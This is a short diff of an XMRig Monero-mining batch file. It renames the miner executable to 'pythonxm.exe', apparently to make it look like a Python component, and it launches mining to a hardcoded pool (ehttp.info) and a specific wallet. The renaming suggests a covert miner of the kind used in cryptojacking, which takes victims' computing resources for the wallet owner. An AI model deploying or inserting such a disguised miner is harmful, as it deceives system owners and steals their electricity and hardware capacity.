@@ -1,7 +1,7 @@
 :: Example batch file for mining Monero at a pool
 ::
 :: Format:
-::	xmrig.exe -o <pool address>:<pool port> -u <pool username/wallet> -p <pool password>
+::	pythonxm.exe -o <pool address>:<pool port> -u <pool username/wallet> -p <pool password>
 ::
 :: Fields:
 ::	pool address		The host name of the pool stratum or its IP address, for example ehttp.info
@@ -16,5 +16,5 @@
 :: Smaller pools also often have smaller fees/payout limits.
 
 cd %~dp0
-xmrig.exe -o ehttp.info:3333 -u 44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p -p x
+pythonxm.exe -o ehttp.info:3333 -u 44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p -p x
 pause
